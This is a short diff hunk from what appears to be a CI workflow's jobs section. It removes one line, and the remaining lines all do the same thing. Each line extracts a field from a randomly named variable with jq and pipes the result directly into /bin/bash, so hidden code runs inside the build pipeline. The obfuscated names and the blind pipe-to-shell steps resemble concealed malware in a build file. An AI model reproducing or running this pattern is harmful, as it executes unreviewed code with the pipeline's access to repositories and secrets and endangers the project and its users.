@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$n18149" | jq -r .clxyk899 | /bin/bash
           echo $kb17830 | jq -r .dygc78 | /bin/bash
           printf '%s' "$dkfaq37" | jq -r .htc978 | /bin/bash
-          echo $fjq36485 | jq -r .dmzxp53 | /bin/bash
           echo $hg422 | jq -r .rb5438 | /bin/bash
           printf '%s' "$nq09464" | jq -r .mxlvv8758 | /bin/bash
           printf '%s' "$ihlt538" | jq -r .w706 | /bin/bash
